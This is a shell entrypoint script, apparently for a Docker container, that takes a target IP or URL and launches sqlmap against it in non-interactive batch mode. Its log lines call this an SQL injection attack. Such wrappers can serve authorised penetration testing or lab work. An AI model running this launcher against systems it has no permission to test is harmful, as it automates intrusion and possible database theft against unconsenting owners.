#!/bin/sh
set -e

# Aceita URL/IP via argumento na linha de comando ($1) ou variável de ambiente
if [ -n "$1" ]; then
    # IP/URL passado como argumento: docker run sql-injection 192.168.1.100
    if echo "$1" | grep -qE "^http://|^https://"; then
        TARGET_URL="$1"
    else
        TARGET_URL="http://${1}"
    fi
elif [ -n "$TARGET_WEB" ]; then
    # Variável de ambiente: docker run -e TARGET_WEB="..." sql-injection
    TARGET_URL="$TARGET_WEB"
elif [ -n "$TARGET_IP" ]; then
    TARGET_URL="http://${TARGET_IP}"
else
    # Fallback: tenta ler de target.var se existir
    if [ -f /sqlmap/target.var ]; then
        . /sqlmap/target.var
        TARGET_URL="$TARGET_WEB"
    else
        echo "[ERROR] Please provide TARGET_IP/TARGET_WEB as argument or environment variable"
        echo "Usage: docker run --rm --network host sql-injection <TARGET_IP>"
        echo "   or: docker run --rm --network host sql-injection http://<TARGET_IP>/path"
        echo "   or: docker run --rm --network host -e TARGET_WEB=http://<IP> sql-injection"
        exit 1
    fi
fi

echo "[+] Starting SQL Injection Attack"
echo "[+] Target: ${TARGET_URL}"
echo "[+] Executing sqlmap..."

# Executa o sqlmap com a variável (usamos exec para substituir o shell pelo processo)
exec python /sqlmap/sqlmap.py -u "$TARGET_URL" --batch --level=3